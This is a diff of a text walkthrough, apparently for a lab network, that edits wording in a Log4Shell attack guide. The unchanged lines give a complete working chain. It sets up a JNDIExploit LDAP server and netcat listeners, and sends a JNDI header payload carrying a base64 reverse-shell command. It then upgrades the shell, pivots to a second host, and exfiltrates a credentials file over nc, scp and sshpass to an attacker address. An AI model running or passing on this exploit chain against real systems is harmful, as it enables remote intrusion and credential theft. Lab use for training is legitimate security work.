@@ -96,8 +96,7 @@ credentials
 username=test
 password=test
 
-Do not store!
-
+:wq!
 
 winscp nostromo-1.9.6.tar.gz
 tar -xf nostromo-1.9.6.tar.gz
@@ -145,9 +144,11 @@ SRV-UB-02-IP= 10.1.0.4
 
 Listen for incomming connections
 --------------------------------
+Start SSH session with SRV-UB-01
+
 nc -lvnp 443
 
-Open other putty session
+Open aother putty session
 
 Start malicious ldap and http server for log4j attack
 ------------------------------------------------------
@@ -157,13 +158,13 @@ cd JNDIExploit.v1.2
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.1.1.4 -p 8888
 
 
-Open other putty session
+Open another putty session
 
 Execute Log4j exploit and send reverse shell command
 ------------------------------------------------------
 
 Browse to https://www.base64encode.org/
-Create base64 encode for below command
+Create base64 encoded string for below command
 
 nc -nv 10.1.1.4 443 -e /bin/bash
 Copy replace XXXX with base64 output
@@ -174,7 +175,7 @@ bmMgLW52IDEwLjEuMS40IDQ0MyAtZSAvYmluL2Jhc2g=
 curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/bmMgLW52IDEwLjEuMS40IDQ0MyAtZSAvYmluL2Jhc2g=}'
 
 
-go back to first putty session and check for incomming session
+go back to first putty session and check incomming session
 
 Confirm access to container
 ---------------------------
@@ -183,7 +184,7 @@ whoami
 
 apk add python
 
-Make revershell interactive
+Make reverse shell interactive
 -------------------------------
 python -c "import pty; pty.spawn('/bin/bash')"
 
@@ -231,9 +232,9 @@ bmMgLW52IDEwLjEuMS40IDQzNDMgLWUgL2Jpbi9iYXNo
 
 curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/bmMgLW52IDEwLjEuMS40IDQzNDMgLWUgL2Jpbi9iYXNo}'
 
-go back to the putty session waiting for sessions on port 4343 and check for incomming sessions
+go back to the putty session waiting for sessions on port 4343 and check for an incomming sessions
 
-Make revershell interactive
+Make reverse shell interactive
 -------------------------------
 python -c "import pty; pty.spawn('/bin/bash')"
 
@@ -249,20 +250,19 @@ now start an nc to listen for incomming files
 
 nc -l -p 443 > creds
 
-Go back to the first webapp revershell and check for an incomming session
+Go back to the first webapp reverse shell and check for an incomming session
 
 SRV-UB-02 (Victim)
 ==================
 
-Make revershell interactive
+Make reverse shell interactive
 -------------------------------
 python -c "import pty; pty.spawn('/bin/bash')"
 
-Do NOT use CTLZ-Z!!
+Do NOT use CTLZ-Z this time!
 
-In the reverse shell connection from SRV-UB-02 run
+In the reverse shell connection from SRV-UB-02 run the following to exfiltrade the target creds file
 
-Exfiltrate creds file
 cd /tmp
 nc -w 3 10.1.2.51 443 < creds
 
@@ -274,10 +274,9 @@ apk add openssh
 scp /creds sdr@10.1.1.4:/tmp/creds2
 
 
-Onliner example
-apk add sshpass
+Oneline command example
+apk add sshpass (requiered to pass password in command)
 
 sshpass -p 'XXXXX' scp -o "StrictHostKeyChecking no" /creds sdr@10.1.1.4:/tmp/creds
-
 
 
